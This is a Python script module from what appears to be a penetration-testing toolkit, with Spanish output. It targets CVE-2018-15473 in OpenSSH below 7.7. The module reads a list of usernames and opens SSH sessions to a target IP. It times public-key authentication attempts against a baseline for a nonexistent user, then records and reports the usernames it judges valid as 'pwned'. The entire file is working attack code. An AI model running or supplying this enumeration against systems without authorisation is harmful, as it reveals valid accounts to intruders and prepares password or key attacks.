# scripts/ssh/enum/user_enum.py
# CVE-2018-15473
import socket
import time
import paramiko
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

class Script(BaseScript):
    name        = "user-enum"
    protocol    = "ssh"
    category    = "enum"
    description = "CVE-2018-15473: enumera usuarios SSH válidos via diferencia de respuesta en auth (OpenSSH < 7.7)."

    EXAMPLES = [
        {"flag": "--userlist", "desc": "Fichero con usuarios a probar",
         "good": "ssh --script=user-enum -t 10.10.10.5 --userlist users.txt",
         "bad":  "ssh --script=user-enum -t 10.10.10.5 (sin userlist)"},
    ]

    def run(self, **kwargs):
        port      = int(kwargs.get("port") or 22)
        timeout   = int(kwargs.get("timeout") or self.target.timeout or 5)
        userlist  = kwargs.get("userlist")
        threshold = float(kwargs.get("threshold") or 50)
        ip        = self.target.ip

        if not userlist:
            console.print("[red]Falta --userlist para user-enum.[/red]")
            return None

        try:
            with open(userlist) as f:
                users = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except OSError as e:
            console.print(f"[red]No se pudo leer {userlist}: {e}[/red]")
            return None

        print_result("SSH", ip, "info",
                     f"user-enum (CVE-2018-15473): probando {len(users)} usuario(s)")

        baseline = self._probe(ip, port, timeout, "__lobera_nonexistent_xyz__")
        valid    = []
        rows     = []

        for user in users:
            elapsed = self._probe(ip, port, timeout, user)
            if elapsed is None:
                rows.append((user, "error", "?"))
                continue
            diff   = elapsed - (baseline or 0)
            exists = diff > threshold
            status = "[bold green]EXISTE[/bold green]" if exists else "no existe"
            rows.append((user, f"{elapsed:.1f} ms", status))
            if exists:
                valid.append(user)
                session_db.save_finding(ip, "SSH", "valid_user", user)

        print_table(f"User enum SSH — {ip}",
                    ["Usuario", "Tiempo respuesta", "Estado"], rows)

        if valid:
            print_result("SSH", ip, "pwned",
                         f"{len(valid)} usuario(s) válido(s): {', '.join(valid)}")
        else:
            print_result("SSH", ip, "info",
                         "Ningún usuario confirmado (puede no ser vulnerable)")

        return valid

    def _probe(self, ip, port, timeout, username):
        try:
            sock = socket.create_connection((ip, port), timeout=timeout)
            t    = paramiko.Transport(sock)
            t.start_client(timeout=timeout)
            key  = paramiko.RSAKey.generate(1024)
            t0   = time.perf_counter()
            try:
                t.auth_publickey(username, key)
            except paramiko.AuthenticationException:
                pass
            except Exception:
                pass
            elapsed = (time.perf_counter() - t0) * 1000
            try: t.close(); sock.close()
            except Exception: pass
            return elapsed
        except Exception:
            return None
